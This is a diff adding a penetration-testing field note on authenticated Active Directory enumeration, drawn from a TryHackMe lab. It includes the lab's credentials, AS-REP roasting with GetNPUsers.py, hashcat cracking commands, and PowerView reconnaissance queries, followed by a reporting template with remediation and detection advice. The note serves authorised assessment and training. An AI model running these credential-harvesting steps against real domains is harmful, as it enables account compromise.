@@ -1195,5 +1195,859 @@ PRIVILEGE ESCALATION
 DOMAIN ADMIN / OBJECTIVE
 ```
 
-**Key principle:** don't jump straight to exploitation. Establish the domain, identify the DC, enumerate exposed services, collect identities, discover credentials, and then build the attack path from evidence.
+**Key principle:** Establish the domain, identify the DC, enumerate exposed services, collect identities, discover credentials, and then build the attack path from evidence.
 
+---
+
+
+# Active Directory — Authenticated Enumeration
+
+### Engagement Field Note
+
+**Assessment phase:** Internal / AD Enumeration
+**Access level:** Valid domain credentials
+**Environment:** Windows Active Directory
+**Primary objective:** Build an accurate picture of users, groups, computers, policies, delegation, and potential attack paths.
+
+---
+
+## 1. Engagement Context
+
+Authenticated enumeration begins once valid domain credentials have been obtained.
+
+Compared with unauthenticated enumeration, authenticated access exposes significantly more AD information, including:
+
+* Domain users and attributes
+* Group membership
+* Computer accounts
+* Administrative membership
+* Password policy
+* Service Principal Names (SPNs)
+* Kerberos configuration
+* Domain relationships
+* Potential privilege relationships
+* AD attack paths suitable for further validation
+
+**Example lab credentials from the supplied material:**
+
+```text
+Domain:   tryhackme.loc
+User:     asrepuser1
+Password: qwerty123!
+DC:       10.211.12.10
+Workstation: 10.211.12.20
+```
+
+> For a real engagement, replace these with client-approved scope and credentials. Do not carry lab credentials into production notes.
+
+---
+
+# 2. Initial Validation
+
+Before beginning enumeration, establish exactly what identity and host context you have.
+
+### From Windows
+
+```powershell
+whoami
+whoami /user
+whoami /groups
+whoami /priv
+```
+
+Useful questions:
+
+| Question             | Command          |
+| -------------------- | ---------------- |
+| Current identity?    | `whoami`         |
+| SID?                 | `whoami /user`   |
+| Group memberships?   | `whoami /groups` |
+| Assigned privileges? | `whoami /priv`   |
+
+Also establish the domain:
+
+```cmd
+echo %USERDOMAIN%
+echo %USERDNSDOMAIN%
+```
+
+---
+
+# 3. AS-REP Roasting
+
+## Objective
+
+Identify accounts configured with:
+
+```text
+UF_DONT_REQUIRE_PREAUTH
+```
+
+These accounts do not require Kerberos pre-authentication, allowing an attacker to request an AS-REP response without first authenticating.
+
+The resulting material can potentially be subjected to **offline password cracking**.
+
+### Attack chain
+
+```text
+Enumerate users
+      ↓
+Identify accounts without Kerberos pre-auth
+      ↓
+Request AS-REP
+      ↓
+Obtain encrypted response
+      ↓
+Offline password cracking
+      ↓
+Validate recovered credential
+      ↓
+Continue authenticated enumeration
+```
+
+---
+
+## Linux — GetNPUsers.py
+
+Given a username list:
+
+```bash
+GetNPUsers.py tryhackme.loc/ \
+    -dc-ip 10.211.12.10 \
+    -usersfile users.txt \
+    -format hashcat \
+    -outputfile hashes.txt \
+    -no-pass
+```
+
+### Important output
+
+A vulnerable account may produce a hash beginning with:
+
+```text
+$krb5asrep$23$
+```
+
+Accounts without the vulnerable configuration produce messages such as:
+
+```text
+User <username> doesn't have UF_DONT_REQUIRE_PREAUTH set
+```
+
+---
+
+## Offline cracking
+
+The supplied room uses Hashcat mode:
+
+```text
+18200
+```
+
+Example:
+
+```bash
+hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+### Engagement evidence to retain
+
+Do **not** unnecessarily retain plaintext credentials in the final report.
+
+Record:
+
+```text
+Account:
+Domain:
+AS-REP roastable: Yes/No
+Hash obtained: Yes/No
+Password recovered: Yes/No
+Password validation: Yes/No
+Impact:
+```
+
+---
+
+# 4. ActiveDirectory PowerShell Module
+
+The official Microsoft `ActiveDirectory` PowerShell module provides structured AD enumeration.
+
+Check whether it is installed:
+
+```powershell
+Get-Module -ListAvailable ActiveDirectory
+```
+
+Import:
+
+```powershell
+Import-Module ActiveDirectory
+```
+
+---
+
+# 5. User Enumeration
+
+### Enumerate all domain users
+
+```powershell
+Get-ADUser -Filter *
+```
+
+For a concise list:
+
+```powershell
+Get-ADUser -Filter * |
+    Select-Object Name,SamAccountName,Enabled
+```
+
+### Individual account
+
+```powershell
+Get-ADUser -Identity <username>
+```
+
+### All properties
+
+```powershell
+Get-ADUser -Identity <username> -Properties *
+```
+
+### High-value properties
+
+The supplied material specifically highlights:
+
+```text
+LastLogonDate
+MemberOf
+Description
+Title
+PwdLastSet
+```
+
+Example:
+
+```powershell
+Get-ADUser -Identity Administrator `
+    -Properties LastLogonDate,MemberOf,Title,Description,PwdLastSet
+```
+
+---
+
+## Targeted user searches
+
+Find usernames containing `admin`:
+
+```powershell
+Get-ADUser -Filter "Name -like '*admin*'"
+```
+
+For engagement purposes, investigate:
+
+* Disabled accounts
+* Stale accounts
+* Administrative accounts
+* Unusual descriptions
+* Service-related accounts
+* Recently modified accounts
+* Accounts with suspicious group membership
+
+---
+
+# 6. Group Enumeration
+
+Enumerate all groups:
+
+```powershell
+Get-ADGroup -Filter *
+```
+
+Concise output:
+
+```powershell
+Get-ADGroup -Filter * |
+    Select-Object Name
+```
+
+### Enumerate group membership
+
+```powershell
+Get-ADGroupMember -Identity "Domain Admins"
+```
+
+Other high-value groups include:
+
+```text
+Domain Admins
+Enterprise Admins
+Administrators
+Backup Operators
+Account Operators
+Server Operators
+Print Operators
+Remote Desktop Users
+Remote Management Users
+```
+
+The exact groups present should be established from the target environment rather than assumed.
+
+---
+
+# 7. Computer Enumeration
+
+Enumerate domain computers:
+
+```powershell
+Get-ADComputer -Filter *
+```
+
+Useful condensed output:
+
+```powershell
+Get-ADComputer -Filter * |
+    Select-Object Name,OperatingSystem
+```
+
+### Engagement questions
+
+For every discovered computer, determine:
+
+```text
+Hostname
+Operating system
+Role
+OU
+Domain controller status
+Last logon
+SPNs
+Delegation configuration
+```
+
+Example from the supplied material:
+
+```powershell
+Get-ADComputer -Filter *
+```
+
+The DC example contained:
+
+```text
+Name: DC
+OperatingSystem: Windows Server 2019 Datacenter
+DNSHostName: DC.tryhackme.loc
+```
+
+It also exposed:
+
+```text
+SERVER_TRUST_ACCOUNT
+TRUSTED_FOR_DELEGATION
+```
+
+Those attributes are particularly important because delegation configuration can influence subsequent AD attack-path analysis.
+
+---
+
+# 8. Domain Password Policy
+
+Use:
+
+```powershell
+Get-ADDefaultDomainPasswordPolicy
+```
+
+Important fields:
+
+```text
+ComplexityEnabled
+MinPasswordLength
+MaxPasswordAge
+MinPasswordAge
+PasswordHistoryCount
+LockoutThreshold
+LockoutDuration
+LockoutObservationWindow
+ReversibleEncryptionEnabled
+```
+
+### Example assessment table
+
+| Property              |   Value | Assessment       |
+| --------------------- | ------: | ---------------- |
+| Complexity            |    True | Record           |
+| Minimum length        |       7 | Potentially weak |
+| Password history      |      24 | Record           |
+| Maximum age           | 42 days | Record           |
+| Lockout threshold     |       0 | Investigate      |
+| Reversible encryption |   False | Positive         |
+
+The actual values must come from the client's environment.
+
+---
+
+# 9. PowerView
+
+PowerView is part of the PowerSploit framework and provides extensive domain reconnaissance functionality.
+
+The supplied environment places the script under:
+
+```text
+C:\Users\asrepuser1\Downloads\PowerSploit-master\Recon
+```
+
+Load it:
+
+```powershell
+Import-Module .\PowerView.ps1
+```
+
+---
+
+# 10. PowerView — Users
+
+Enumerate domain users:
+
+```powershell
+Get-DomainUser
+```
+
+Filter by username:
+
+```powershell
+Get-DomainUser *admin*
+```
+
+PowerView exposes considerably more raw AD attributes than a simple:
+
+```cmd
+net user /domain
+```
+
+This makes it useful when hunting for unusual account configurations.
+
+---
+
+# 11. PowerView — Groups
+
+Enumerate groups:
+
+```powershell
+Get-DomainGroup
+```
+
+Filter:
+
+```powershell
+Get-DomainGroup "*admin*"
+```
+
+Look specifically at:
+
+```text
+member
+description
+admincount
+samaccountname
+objectsid
+```
+
+For privileged groups, map:
+
+```text
+Group → Members → Nested Groups → Users
+```
+
+---
+
+# 12. PowerView — Computers
+
+Enumerate domain computers:
+
+```powershell
+Get-DomainComputer
+```
+
+Useful attributes include:
+
+```text
+name
+dnshostname
+operatingsystem
+serviceprincipalname
+useraccountcontrol
+lastlogon
+pwdlastset
+```
+
+This is particularly valuable for identifying:
+
+* Domain controllers
+* Servers
+* Workstations
+* Service accounts represented through SPNs
+* Delegation configurations
+
+---
+
+# 13. High-Value PowerView Queries
+
+### Administrative accounts
+
+```powershell
+Get-DomainUser -AdminCount
+```
+
+This identifies users with:
+
+```text
+adminCount
+```
+
+set, which is an important indicator for privileged-account investigation.
+
+---
+
+### SPN-bearing accounts
+
+```powershell
+Get-DomainUser -SPN
+```
+
+These accounts have non-null Service Principal Names and should be reviewed as potential **Kerberoasting candidates**.
+
+Record:
+
+```text
+Account
+SPN
+Service
+Host
+Privilege/group membership
+```
+
+Do not assume every SPN account is exploitable merely because an SPN exists.
+
+---
+
+# 14. Enumeration Workflow
+
+For an engagement, I would keep the workflow structured rather than randomly executing commands.
+
+```text
+                    VALID CREDENTIAL
+                          │
+                          ▼
+                  Identity Validation
+                          │
+                          ▼
+                    Domain Discovery
+                          │
+             ┌────────────┼────────────┐
+             ▼            ▼            ▼
+           Users        Groups      Computers
+             │            │            │
+             └────────────┼────────────┘
+                          ▼
+                   Privilege Mapping
+                          │
+             ┌────────────┼────────────┐
+             ▼            ▼            ▼
+        Password       SPNs        Delegation
+         Policy
+             │            │            │
+             └────────────┼────────────┘
+                          ▼
+                   Attack Path Review
+                          │
+             ┌────────────┼────────────┐
+             ▼            ▼            ▼
+           AS-REP     Kerberoast    BloodHound
+```
+
+---
+
+# 15. BloodHound Preparation
+
+The supplied room also identifies BloodHound as a major authenticated-enumeration capability.
+
+The purpose is not simply to collect lists of objects, but to determine **relationships**.
+
+Think:
+
+```text
+User
+ ↓
+Group membership
+ ↓
+Computer access
+ ↓
+Local administrator
+ ↓
+Session
+ ↓
+Delegation
+ ↓
+Domain privilege
+```
+
+Rather than asking:
+
+> "What users exist?"
+
+BloodHound allows you to ask:
+
+> "What relationship connects this compromised account to a privileged target?"
+
+That distinction is important during an engagement.
+
+---
+
+# 16. Attack-Path Prioritization
+
+Once enumeration is complete, prioritize findings according to potential impact.
+
+### Priority 1 — Direct privilege relationships
+
+```text
+Current user
+   ↓
+Privileged group
+   ↓
+Domain Admin / equivalent
+```
+
+### Priority 2 — Credential exposure
+
+```text
+Configuration files
+Backup files
+SMB shares
+Scripts
+Service credentials
+```
+
+### Priority 3 — Kerberos weaknesses
+
+```text
+AS-REP roastable accounts
+        +
+SPN-bearing accounts
+```
+
+### Priority 4 — Delegation
+
+Review computers/accounts exhibiting delegation-related configuration.
+
+### Priority 5 — Excessive permissions
+
+Look for:
+
+```text
+Users with unnecessary admin rights
+Groups with excessive membership
+Workstations accessible by inappropriate users
+Service accounts with excessive privileges
+```
+
+---
+
+# 17. Engagement Evidence Checklist
+
+For each enumeration phase, capture evidence rather than dumping everything indiscriminately.
+
+### Domain
+
+```text
+[ ] Domain name
+[ ] Forest/domain structure
+[ ] Domain controllers
+[ ] DNS names
+[ ] Sites/OUs
+```
+
+### Users
+
+```text
+[ ] Total users
+[ ] Enabled users
+[ ] Disabled users
+[ ] Privileged users
+[ ] Service accounts
+[ ] AS-REP candidates
+[ ] Suspicious descriptions
+[ ] Stale accounts
+```
+
+### Groups
+
+```text
+[ ] Domain Admins
+[ ] Enterprise Admins
+[ ] Administrators
+[ ] Backup Operators
+[ ] Other privileged groups
+[ ] Nested memberships
+```
+
+### Computers
+
+```text
+[ ] Domain controllers
+[ ] Servers
+[ ] Workstations
+[ ] Operating systems
+[ ] SPNs
+[ ] Delegation
+```
+
+### Policy
+
+```text
+[ ] Minimum password length
+[ ] Complexity
+[ ] Password history
+[ ] Maximum password age
+[ ] Lockout threshold
+[ ] Lockout duration
+[ ] Reversible encryption
+```
+
+---
+
+# 18. Compact Command Reference
+
+## Native AD module
+
+```powershell
+Import-Module ActiveDirectory
+
+Get-ADUser -Filter *
+
+Get-ADUser -Identity <USER> -Properties *
+
+Get-ADUser -Filter "Name -like '*admin*'"
+
+Get-ADGroup -Filter *
+
+Get-ADGroupMember -Identity "Domain Admins"
+
+Get-ADComputer -Filter *
+
+Get-ADComputer -Filter * |
+    Select Name,OperatingSystem
+
+Get-ADDefaultDomainPasswordPolicy
+```
+
+## PowerView
+
+```powershell
+Import-Module .\PowerView.ps1
+
+Get-DomainUser
+
+Get-DomainUser *admin*
+
+Get-DomainGroup
+
+Get-DomainGroup "*admin*"
+
+Get-DomainComputer
+
+Get-DomainUser -AdminCount
+
+Get-DomainUser -SPN
+```
+
+## AS-REP
+
+```bash
+GetNPUsers.py <DOMAIN>/ \
+    -dc-ip <DC_IP> \
+    -usersfile users.txt \
+    -format hashcat \
+    -outputfile hashes.txt \
+    -no-pass
+```
+
+Offline validation/cracking in the lab:
+
+```bash
+hashcat -m 18200 hashes.txt <WORDLIST>
+```
+
+---
+
+# 19. Findings to Look For
+
+The enumeration itself isn't necessarily the finding. The important part is translating observations into security impact.
+
+| Observation                        | Potential Finding                     |
+| ---------------------------------- | ------------------------------------- |
+| Pre-auth disabled                  | AS-REP Roasting exposure              |
+| Weak password recovered            | Credential compromise                 |
+| Excessive Domain Admin membership  | Excessive privilege                   |
+| SPN on privileged account          | Kerberoasting exposure                |
+| Sensitive data in shares           | Information disclosure                |
+| Weak password policy               | Credential attack exposure            |
+| Excessive workstation admin rights | Lateral movement risk                 |
+| Dangerous delegation               | Privilege escalation risk             |
+| Stale privileged accounts          | Account hygiene issue                 |
+| Unnecessary service privileges     | Privilege escalation/lateral movement |
+
+---
+
+# 20. Recommended Engagement Notes Format
+
+For each discovered issue, use a consistent record:
+
+```text
+Finding ID:
+Title:
+Severity:
+Affected Asset:
+Affected Account/Group:
+Discovery Method:
+Evidence:
+Security Impact:
+Attack Path:
+Validation Performed:
+Credentials Exposed: Yes/No
+Privilege Obtained: Yes/No
+Remediation:
+Detection Recommendation:
+```
+
+### Example
+
+```text
+Finding ID: AD-001
+Title: User account configured without Kerberos pre-authentication
+Severity: High
+Affected Account: <REDACTED>
+
+Discovery Method:
+GetNPUsers.py
+
+Evidence:
+Account returned an AS-REP response despite no authenticated
+Kerberos pre-authentication.
+
+Security Impact:
+An attacker able to obtain the AS-REP material may perform
+offline password guessing against the account.
+
+Validation:
+AS-REP material was obtained and tested offline.
+
+Remediation:
+Enable Kerberos pre-authentication unless there is a documented
+business requirement for the exception. Ensure the account uses
+a strong, unique password.
+
+Detection:
+Monitor unusual AS-REQ activity and investigate requests
+associated with accounts configured without pre-authentication.
+```
+
+---
